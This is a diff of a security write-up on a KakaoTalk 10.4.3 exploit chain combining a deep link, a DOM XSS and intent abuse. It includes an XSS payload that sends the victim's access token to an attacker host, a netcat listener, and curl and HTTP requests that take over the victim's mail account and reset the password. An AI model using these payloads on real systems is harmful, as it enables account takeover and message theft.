@@ -11,9 +11,10 @@
   - [Password Reset](#attacker-uses-the-access-token-to-reset-the-victims-password)
   - [Profit](#attacker-registers-herhis-device-the-victims-kakaotalk-account)
 - [Appendix](#appendix)
+  - [DOM XSS](#dom-xss)
   - [ffuf](#brute-forcing-with-ffuf)
 
-In KakaoTalk `10.4.3` there are a couple of low-hanging fruit vulnerabilities which when combined together allow an attacker to steal another user's chat messages.
+In KakaoTalk `10.4.3` there are a couple of low-hanging fruit vulnerabilities which when combined allow an attacker to steal another user's chat messages.
 
 In the following we describe the vulnerabilities in detail and present a [PoC](#poc) at the end.
 
@@ -22,40 +23,52 @@ In the following we describe the vulnerabilities in detail and present a [PoC](#
 The `CommerceBuyActivity` WebView is the main entry point and very interesting from an attacker's point of view:
 
 - It's exported and can be started with a deep link (e.g., `adb shell am start kakaotalk://buy`)
-- It has Javascript enabled (`settings.setJavaScriptEnabled(true);`)
-- It supports the `intent://` [scheme](https://developer.chrome.com/docs/multidevice/android/intents/) to send data to other (non-exported) app components via Javascript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
+- It has JavaScript enabled (`settings.setJavaScriptEnabled(true);`)
+- It supports the `intent://` [scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf) to send data to other (non-exported) app components via JavaScript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
 - There's no sanitization of `intent://` URIs (e.g., the `Component` or `Selector` is **not** set to `null`). So, potentially any app component can be accessed.
 
-This means that if we find a way to run our own Javascript inside the `CommerceBuyActivity` we would have the ability to start arbitrary (non-exported) app components when the user clicks on a malicious `kakaotalk://buy` deep link.
+This means that if we find a way to run our own JavaScript inside the `CommerceBuyActivity` we would have the ability to start arbitrary (non-exported) app components when the user clicks on a malicious `kakaotalk://buy` deep link.
 
 Unfortunately, we can't load arbitrary attacker-controlled URLs as there is some validation going on:
 
 ```java
 public final String m17260P5(Uri uri) {
+    // This string is "https://buy.kakao.com"
     String m36725d = C24983v.m36725d();
+
     if (uri != null) {
         if (!C46907a.m54284B(uri.toString(), new ArrayList(Arrays.asList(C47684e.f174778c0, "buy")))) {
             return null;
         }
+
         if (C43097e.m51424i(uri.getQueryParameter("refresh"), RTCStatsParser.Key.TRUE)) {
             this.f33349x = true;
         }
+
         if (("kakaotalk".equals(uri.getScheme()) || "alphatalk".equals(uri.getScheme())) && "buy".equals(uri.getHost())) {
+            // URL path can be controlled by an attacker
             if (!TextUtils.isEmpty(uri.getPath())) {
                 m36725d = String.format("%s%s", m36725d, uri.getPath());
             }
+
+            // URL query parameters can be controlled by an attacker
             if (!TextUtils.isEmpty(uri.getQuery())) {
                 m36725d = String.format("%s?%s", m36725d, uri.getQuery());
             }
+
+            // URL fragment can be controlled by an attacker
             if (!TextUtils.isEmpty(uri.getFragment())) {
                 return String.format("%s#%s", m36725d, uri.getFragment());
             }
+
             return m36725d;
         } else if (C14325o2.f55096k.matcher(uri.toString()).matches()) {
             String uri2 = uri.toString();
+
             if (uri2.startsWith("http://")) {
                 return uri2.replace("http://", "https://");
             }
+
             return uri2;
         }
     }
@@ -65,7 +78,7 @@ public final String m17260P5(Uri uri) {
 
 If you take a look at the code you'll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String `m36725d` which is `https://buy.kakao.com` in our case. That means if a user clicks on the deep link `kakaotalk://buy/foo` the URL `https://buy.kakao.com/foo` gets loaded in the `CommerceBuyActivity` WebView.
 
-Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that we can run Javascript? 🤔
+Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that we can run JavaScript? 🤔
 
 ## URL Redirect to DOM XSS
 
@@ -77,7 +90,7 @@ Funny enough, there was already a Stored XSS as https://m.shoppinghow.kakao.com/
 
 Continuing to browse the DOM we discovered another [endpoint](https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo) where the search query was passed to a `innerHTML` sink (see [DOM Invader notes](#dom-xss)). Eventually, the PoC XSS payload turned out to be as simple as `"><img src=x onerror=alert(1);>`.
 
-At this point we could run arbitrary Javascript in the `CommerceBuyActivity` WebView when the user clicked on a deep link such as `kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:"><img src=x onerror=alert(1);>`.
+At this point we could run arbitrary JavaScript in the `CommerceBuyActivity` WebView when the user clicked on a deep link such as `kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:"><img src=x onerror=alert(1);>`.
 
 Since the `CommerceBuyActivity` supports the `intent://` scheme we could now start arbitrary non-exported app components 🥳
 
@@ -92,14 +105,18 @@ public final void onCreate(Bundle bundle) {
     String str;
     super.onCreate(bundle);
     String str2 = null;
+
+    // Here the URL can be passed to MyProfileSettingsActivity via an intent
     if (getIntent().hasExtra("EXTRA_URL")) {
         str = getIntent().getStringExtra("EXTRA_URL");
     } else {
         str = null;
     }
+    
     if (getIntent().hasExtra("EXTRA_TITLE")) {
         str2 = getIntent().getStringExtra("EXTRA_TITLE");
     }
+
     WebSettings settings = this.f192507q.getSettings();
     settings.setJavaScriptEnabled(true);
     settings.setSupportZoom(true);
@@ -110,23 +127,31 @@ public final void onCreate(Bundle bundle) {
     this.f192507q.setWebViewClient(new C8206a());
     this.f192507q.setWebChromeClient(new C8207b(this.f192508r));
     this.f192507q.setDownloadListener(new C34313v1(this, 0));
+    
     if (str2 != null) {
         setTitle(str2);
     }
+    
     if (str == null) {
         str = C24983v.m36731j(C47684e.f174774b, "android/adid/manage.html");
     }
+    
     WebView webView = this.f192507q;
     HashMap m16559U5 = m16559U5();
+
+    // URL host validation is broken. In fact, any URL can be loaded.
     if (C55281p.m61314a0(C47684e.f174709D0, Uri.parse(str).getHost(), true)) {
         m16559U5.putAll(companion.getInstance().getBreweryHeader());
     }
+
     C52084x c52084x = C52084x.f192756a;
+
+    // Finally, the URL is loaded.
     webView.loadUrl(str, m16559U5);
 }
 ```
 
-This included `javascript://` and `data://` schemes which allow to run Javascript. Also, it supported `content://` URLs, so a URL such as `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json` opens KakaoTalk's Firebase Installation configuration in the `MyProfileSettingsActivity` WebView.
+This included `javascript://` and `data://` schemes which allow to run JavaScript. Also, it supported `content://` URLs, so a URL such as `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json` opens KakaoTalk's Firebase Installation configuration in the `MyProfileSettingsActivity` WebView.
 
 Last but not least, it leaked an access token in the `Authorization` HTTP header. For example, a command such as `adb shell am start "intent:#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=https://foo.bar\;end"` would send the token to `https://foo.bar`.
 
@@ -147,15 +172,15 @@ Let's break it down:
 - `https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:` had the XSS issue
 - `"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">` is the XSS payload. We had to Base64 encode the "attacker URL" to bypass some sanitization checks.
 
-Now, in possession of the access token what could we do with it? Well, what about using it to takeover the victim's Kakao Mail account that was used for KakaoTalk registration!
+Now, in possession of the access token what could we do with it? Well, what about using it to take over the victim's Kakao Mail account that was used for KakaoTalk registration!
 
 > **_NOTE:_** If the victim doesn't have a Kakao Mail account it's possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user's previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.
 
-First, we needed to check whether the victim actually uses Kakao Mail:
+First, we needed to check if the victim actually uses Kakao Mail:
 
 ```bash
 curl -i -s -k -X $'GET' \
-    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 6527064d05514319b4d9bd50dfc52dfa000000170176577718100112EIKD4_dzw-060c2745c83d8e5b3763c6bf3a10f73987d6ce9e00328ef5631b31d2e7997ec7' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
+    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
     $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1693786891&lang=en&vc=2610380&email=2&adid=&adid_status=-1'
 ```
 
@@ -163,8 +188,8 @@ Next, we had to grab another access token to access Kakao Mail:
 
 ```bash
 curl -i -s -k -X $'POST' \
-    -H $'Host: api-account.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 6527064d05514319b4d9bd50dfc52dfa000000170176577718100112EIKD4_dzw-060c2745c83d8e5b3763c6bf3a10f73987d6ce9e00328ef5631b31d2e7997ec7' -H $'A: android/10.4.3/en' -H $'C: 2cc348d0-b7f7-464c-b72b-1e3f66a04362' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 174' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
-    --data-binary $'key_type=talk_session_info&key=6527064d05514319b4d9bd50dfc52dfa000000170176577718100112EIKD4_dzw-060c2745c83d8e5b3763c6bf3a10f73987d6ce9e00328ef5631b31d2e7997ec7&referer=talk' \
+    -H $'Host: api-account.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/10.4.3/en' -H $'C: 2cc348d0-b7f7-464c-b72b-1e3f66a04362' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 174' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
+    --data-binary $'key_type=talk_session_info&key=64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&referer=talk' \
     $'https://api-account.kakao.com/v1/auth/tgt'
 ```
 
@@ -201,7 +226,7 @@ Accept-Language: en-US,en;q=0.9
 4. Click on `Send` and confirm the target details
 5. Right-click in the request window, select `Request in browser > In original session` and copy the URL into Burp's browser.
 
-As pointed out above we can also create a new Kakao Mail account on the user's behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the `Authorization` header):
+As pointed out above we could also create a new Kakao Mail account on the user's behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the `Authorization` header):
 
 ```
 GET /kakao_mail/main?continue=https://talk.mail.kakao.com HTTP/1.1
@@ -211,7 +236,7 @@ Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610430
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Authorization: 601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e
+Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
 Http_a: android/10.4.3/en
 X-Requested-With: com.kakao.talk
 Sec-Fetch-Site: none
@@ -231,7 +256,7 @@ Since we could now access the victim's Kakao Mail account a password reset was t
 
 ```bash
 curl -i -s -k -X $'GET' \
-    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 6527064d05514319b4d9bd50dfc52dfa000000170176577718100112EIKD4_dzw-060c2745c83d8e5b3763c6bf3a10f73987d6ce9e00328ef5631b31d2e7997ec7' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
+    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.4.3 An/11 en' -H $'Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
     $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1693786891&lang=en&vc=2610380&email=2&adid=&adid_status=-1'
 ```
 
@@ -287,7 +312,7 @@ location.href = decodeURIComponent("kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFron
 $ python3 -m http.server 8888
 ```
 
-... opens a Netcat listener in another terminal window: `$ nc -lp 5555`. Easy ;-)
+... opens a Netcat listener in another terminal window: `$ nc -l 5555`. Easy ;-)
 
 ### Victim clicks the link and leaks an access token to the attacker
 
@@ -300,7 +325,7 @@ Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36;KAKAOTALK 2610420;KAKAOTALK 10.4.2
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-authorization: 6527064d05514319b4d9bd50dfc52dfa000000170176577718100112EIKD4_dzw-060c2745c83d8e5b3763c6bf3a10f73987d6ce9e00328ef5631b31d2e7997ec7
+authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
 os_name: Android
 kakao-buy-version: 1.0
 os_version: 10.4.2
@@ -349,6 +374,8 @@ Example response:
 ```
 
 And we're in! Profit 🥳🥳🥳
+
+https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9
 
 ## Appendix
 
